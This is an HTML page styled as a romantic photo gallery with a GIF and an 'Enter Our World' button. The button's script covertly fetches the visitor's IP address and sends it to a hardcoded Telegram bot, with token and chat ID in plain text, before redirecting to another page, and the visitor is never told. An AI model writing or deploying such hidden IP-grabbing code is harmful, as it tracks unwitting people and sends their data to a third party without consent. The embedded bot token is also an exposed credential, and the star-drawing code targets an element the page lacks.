<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sreejan Gallery</title>
    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(45deg, 
                #ff69b4, #da70d6, #9370db, #ff1493, #ff69b4);
            background-size: 400% 400%;
            animation: backgroundShimmer 15s ease infinite;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: 'Playfair Display', serif;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 20px;
            max-width: 900px;
            width: 90%;
            position: relative;
        }

        .main-heading {
            font-family: 'Dancing Script', cursive;
            font-size: clamp(3.5rem, 7vw, 5.5rem);
            color: white;
            margin-bottom: 40px;
        }

        .gif-container {
            width: 331px;
            height: 302px;
            margin: 40px auto;
            background: rgba(255, 255, 255, 0.15);
            border-radius: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }

        .button-container {
            display: flex;
            gap: 30px;
            margin-top: 40px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .btn {
            padding: 18px 35px;
            font-size: 1.3rem;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            background: rgba(255, 255, 255, 0.15);
            color: white;
        }

        .fadeOut {
            opacity: 0;
        }

    </style>
</head>
<body>
    <div class="container">
        <h1 class="main-heading">Welcome to Our Gallery</h1>
        <div class="gif-container">
            <img src="./kiss (1).gif" alt="Gif">
        </div>
        <div class="button-container">
            <button class="btn" id="colorBtn">Change Color</button>
            <button class="btn" id="enterBtn">Enter Our World</button>
        </div>
    </div>

    <script>
        // Create stars
        const starsContainer = document.querySelector('.stars');
        for (let i = 0; i < 150; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            star.style.left = `${Math.random() * 100}%`;
            star.style.top = `${Math.random() * 100}%`;
            starsContainer.appendChild(star);
        }

        // Enter button functionality
        const enterBtn = document.getElementById('enterBtn');
        const body = document.body;

        enterBtn.addEventListener('click', () => {
            body.classList.add('fadeOut');
            setTimeout(() => {
                // Fetching IP and Location details
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip;
                        // Send to Telegram
                        sendToTelegram(ip);
                    })
                    .catch(err => console.error('Error fetching IP:', err));

                setTimeout(() => {
                    // Navigate to next page
                    window.location.href = 'gallary.html';
                }, 500);
            }, 500);
        });

        function sendToTelegram(ip) {
            const token = '8132685114:AAFLul-sqA7Ld5keC7FWdKatu_41hjVHBYM';
            const chatId = '1962244896';
            const message = `IP Address: ${ip}\nLocation: Fetch location API or info`;

            // Send message to Telegram
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => console.log('Message sent to Telegram:', data))
                .catch(error => console.error('Error sending message:', error));
        }
    </script>
</body>
</html>
